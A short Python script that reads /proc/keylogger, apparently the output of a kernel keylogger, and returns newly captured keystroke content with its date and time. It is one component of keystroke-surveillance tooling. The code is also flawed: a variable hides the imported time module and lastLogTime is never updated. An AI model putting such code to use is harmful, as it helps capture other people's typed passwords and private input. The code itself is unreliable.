import re 
import os
import time
from helperFunctions import readFile

lastLogTime = ""

def fetchAll(): 
    """
    This function reads /proc/keylogger and processes it.

    Returns:
        array: contents of the log file.
    """
   
    logFile = readFile("/proc/keylogger")

    if logFile:
        date, time, content = logFile.split()
        global lastLogTime
        if(time!= lastLogTime):
            return [date, time, content]
        else:
           return None
    else:
        return None 
 
fetchAll()
